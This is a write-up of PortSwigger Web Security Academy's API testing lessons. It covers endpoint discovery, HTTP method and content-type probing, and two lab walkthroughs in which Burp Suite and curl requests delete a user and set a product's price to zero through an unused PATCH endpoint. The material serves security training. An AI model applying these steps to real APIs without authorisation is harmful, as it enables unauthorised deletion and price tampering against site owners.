# API Testing [PortSwigger Academy]

<sup>This write-up covers the API Testing section of Web Security Academy by PortSwigger.</sup>

## API Recon

_Discover API's attack surface_ --- Find out as much information about API as possible.

_API endpoints_ --- These are locations where API receives requests about a specific resource on its server.

_Example `GET` request_:

```
GET /api/books HTTP/1.1
Host: example.com
```

_API endpoint_: `/api/books`. This, in theory should return a list of all books on API's server. While `/api/books/mystery` endpoint should return all books in `mystery` category.

_Interaction with API_:

- What input data does the API process? What compulsory parameters? What optional parameters? 
  * _An example_: Say, our api endpoint is `GET /weather` which returns weather in a given location. `location` parameter is __required__, the example value of it could be `"New York"`. __Optional__ parameters could be `units` with value `metric|imperial`, `lang` with value `en|fr|es`, `forecast_days` with value `1-10`. So the final API call could like like this: `GET /weather?location=London&units=metric&lang=en&forecast_days=4`.
- What types of requests does API accept? What HTTP methods? Which media formats?
  * _An example_: Using the above example, in `GET /weather` an __HTTP method__ would be `GET`. It could also be `POST`, `PUT`, `DELETE`, etc. The __media formats__ are also referred to as __MIME types__ or __content types__ describe how the data is formatted when it's sent to or from the API. This information shows up in __HTTP headers__, mainly in `Content-Type` or `Accept` and value is typically `application/json` but it could be something else, depending on the API and which __media formats__ it accepts.
- What rate limits are applied? What authentication mechanisms are enforced?
  * _An example_: Both of these are __HTTP headers__ just like __media formats__. Typically they looks like `Authorization: Bearer <token>` and `X-RateLimit-Limit: 100` or `X-RateLimit-Remaining: 50` or `X-RateLimit-Reset: 213123123`, etc. The idea is, that most APIs don't let you use them freely, so you have to __authenticate__ with an _API key_, _Bearer Token_, _Basic Auth_, _OAuth 2.0_, _JWT_, etc. As an authenticated or unauthenticated user, an API also typically controls how many requests you are allowed to make to the API in a given time period, could be anything from _1000/day_ to _100/minute_.

## API Documentation

_API Documentation_ --- A way for developers to understand how to use an API through a set of technical descriptions of endpoints and calls. It can be in both machine-readable and human-readable forms. Machine-readable documentation is designed for the software to automate integration and validation of the API with itself. It is usually written in a structured format like JSON or XML. 

_Availablity_ --- API documentation is usually publicly available, especially if it's intended for the use by external developers. In such cases the reconnaissance should begin with reviewing said documentation.

### Discovering API documentation

In cases when the API documentation isn't available, it is usually accessed or found by browsing applications that use the API. Tools such as __Burp Scanner__ can be used to crawl the API. Using __Burp Browser__ we can also manually browse the application and find endpoints in the requests saved in Burp Suite that might refer to the API documentation. 

In case we identified an endpoint for the resource of an API, then we need to investigate its base path. For example in case we identified the resource endpoint `/api/swagger/v1/users/123` we need to browse every level of this path and see what it returns:

- `/api/swagger/v1/users`
- `/api/swagger/v1`
- `/api/swagger`
- `/api`

__Burp Suite__'s __Intruder__ can also be used with a list of common paths to find the documentation. 

### Lab: Exploiting an API endpoint using documentation

Turn on Burp Suite and access the lab using Burp Suite's browser. 

Log in to the application with credentials `wiener:peter` and update email address.

In Burp Suite -> Proxy -> HTTP history, navigate the list of requests and find `PATCH /api/user/wiener` request. Right click on it and click __Send to Repeater__.

Going to the __Repeater__ tab if you send this request once, it will return the credentials for user `wiener`:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 53

{
  "username":"wiener",
  "email":"attacker@fakemail.com"
}
```

If we remove `/wiener` from the request path and send the request with endpoint `/api/user` it will return an error because there is no user identifier:

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 50

{
  "error":"Malformed URL: expecting an identifier"
}
```

This time if we remove `/user` as well from the path and send the request with endpoint `/api` it will return the API documentation. To see it, right-click on the response and click __Show response in browser__. The following will show up:

![API documentation](psa_apitesting_ss01.png "API documentation")

Now click on the `DELETE` row and enter carlos in the username field and click send request. Notice how a `curl` command is generated to achieve the same purpose:

```bash
curl -vgw "\n" -X DELETE 'https://0a0{.....}02a.web-security-academy.net/api/user/carlos' -d '{}'
```

- _`-v` --- Verbose mode --- This tells `curl` to show detailed info about the request and response, including request headers, response headers, connection status, etc._

- _`-g` --- (disable URL globbing) Globoff --- Disables special character expansion like `{}` and `[]` in URLs. Useful if you're passing those characters literally (which you are here in the `-d '{}'` part)._

- _`-w "\n"` --- Write-out --- This lets you format the output from curl after the request. Here, you're just asking `curl` to print a newline (`\n`) after the response._

- _`-X DELETE` --- Specifies the HTTP method --- You're explicitly telling curl to send a `DELETE` request, effectively asking the server to remove a resource._

- _`'https://.../api/user/carlos'` --- The API endpoint URL --- This is the target resource --- an API that likely handles users. You're sending a `DELETE` request to remove the user `carlos`._

- _`-d '{}'` --- The request body --- Even though DELETE requests often don't require a body, some APIs expect an empty JSON object `{}` or some kind of payload. If you omit `-d`, some APIs might reject the request or default to `GET`._

The lab is solved now!

> NOTE: Check out [walkthrough](apitesting_lab01_zaproxy.md) of this lab in OWASP Zed Attack Proxy.

### Using machine-readable documentation

There are a lot of automated tools available to analyze machine-readable API documentation.

One of those is __Burp Scanner__ which can be used to crawl and audit OpenAPI documentation, or any other documentation in JSON and YAML format. Another app is __OpenAPI Parser BApp__ that can be used for this purpose. 

Specialized tools like __Postman__ or __SoapUI__ can be used to test the documented endpoints. 

## Identifying API endpoints

By browsing applications that use the API in question, a lot of information can be gathered. Even if the API documentation is available, it's still worth manual browsing, because sometimes documentation may be inaccurate. 

Using the scanner apps mentioned above, the application can be crawled and then interesting endpoints can be manually investigated for potential attack surfaces with Burp Browser.

_Things to look out for:_

- Patterns in URL structure that suggest API endpoints, like `/api/`;
- JavaScript files might contain references to API endpoints;

Burp scanner automatically extracts some endpoints it finds during crawling, but for a deeper dive JS Link Finder BApp can be used. 

### Interacting with API endpoints

Generally Burp Repeater and Burp Intruder can be used to interact with API endpoints. This enables us to observe the API's behavior and discover attack surfaces, namely by changing the data that API receives, some of which we mentioned in the beginning: __compulsory__ and __optional__ parameters, __MIME types__ and __HTTP methods__, etc. 

It's important to review responses and errors closely as we interact with the API, because sometimes these might include information that can be used to construct a valid HTTP request.

### Identifying supported HTTP methods

The HTTP method specifies the action to be performed on a resource. For example:

- `PATCH` applies partial changes to a resource, like changing only `email` of a user but not the entire user record including their name or any other data. 
  * `curl -X PATCH https://example.com/api/user/42 -H "Content-Type: application/json" -d '{"email": "newemail@example.com"}'` --- In this command `-H` stands for Header, and is used to specify an HTTP header in the request. 
- `OPTIONS` retrieves information on the types of request methods that can be used on a resource. `OPTIONS /api/user/42 HTTP/1.1` might return a response with a header `Allow: GET, POST, PATCH, DELETE, OPTIONS`.
  * `curl -X OPTIONS -i https://example.com/api/user/42` --- `-i` in this command stands for include response headers, which tells `curl` to include __response headers__ in the output, along with response body. 

It is important to test all potentially applicable HTTP methods when investigating API endpoints, because this may identify additional endpoint functionality, opening up more attack surface. For example, the same endpoint `/api/tasks` with a `GET` method might just return a list of tasks, but with `POST` method it might create a new task and with `DELETE` method and endpoint `/api/tasks/1` might delete a task.

A built-in HTTP verbs list can be used in Burp Intruder to automatically cycle through a range of methods.

> NOTE: When testing different HTTP methods, target low-priority objects. This helps make sure that you avoid unintended consequences, for example altering critical items or creating excessive records.

### Identifying supported content types

API endpoints may behave differently depending on the format the data is provided to them in the request. So by changing content type in the request, we might be able to trigger errors that disclose useful information, bypass flawed defenses, take advantage of differences in processing logic, for example, an API might be secure when handling JSON data but susceptible to injection attacks when dealing with XML. 

To change the content type, the `Content-Type` header must be modified in the request, and the request body should be reformatted accordingly. For example, if the `Content-Type` was initially `application/json` and the request body contained a JSON object, the request body must be updated to match the new format. If the `Content-Type` is changed to `application/xml`, the request body needs to be restructured from JSON to XML.

A Content type converter BApp can be used to automatically convert data submitted within requests between XML and JSON.

### Lab: Finding and exploiting an unused API endpoint

Turn on Burp Suite, open Burp Browser and access the lab with it. 

__DO NOT__ log in to the application with credentials `wiener:peter` __just yet__. 

Click _View details_ on any product _except_ __Lightweight l33t Leather Jacket__, in my case, I chose __AbZorba Ball__.

In __Proxy__ > __HTTP history__ right click on the API request for the product, in my case `GET /api/products/3/price` and __Send to Repeater__. 

In the __Repeater__ tab, change the HTTP method for the API request from `GET` to `OPTIONS`, then send the request. The response will specify that the `GET` and `PATCH` methods are allowed `Allow: GET, PATCH`.

```
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

Change the method of the API request from `OPTIONS` to `PATCH` and send it. You will receive an `Unauthorized` message:

```
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

This indicates that we need to be authenticated to update the order. Authenticate with credentials `wiener:peter`, navigate to the product __Lightweight l33t Leather Jacket__.

In __Proxy__ > __HTTP history__, right click the request `GET /api/products/1/price`, right click it and __Send to Repeater__.

In the request pane of the Repeater tab change the HTTP method from `GET` to `PATCH` and send th request. This causes an error due to `Content-Type` header not being set as `application/json`. 

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 93

{
  "type":"ClientError",
  "code":400,
  "error":"Only 'application/json' Content-Type is supported"
}
```

Let's add it in the headers of the request and also a JSON object `{}` as the request body and send the request. The error caused this time is due to the missing `price` parameter in the request body.

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 77

{
  "type":"ClientError",
  "code":400,
  "error":"'price' parameter missing in body"
}
```

Add a `price` parameter with a value of `0` to the JSON object as `{"price":0}` and send the request again. The response will indicate status code `200` and that the price for this product now is `$0.00`:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{
  "price":"$0.00"
}
```

Add __Lightweight "l33t" Leather Jacket__ to cart now and place order to solve the lab.

> NOTE: Check out [walkthrough](apitesting_lab02_zaproxy.md) of this lab in OWASP Zed Attack Proxy.


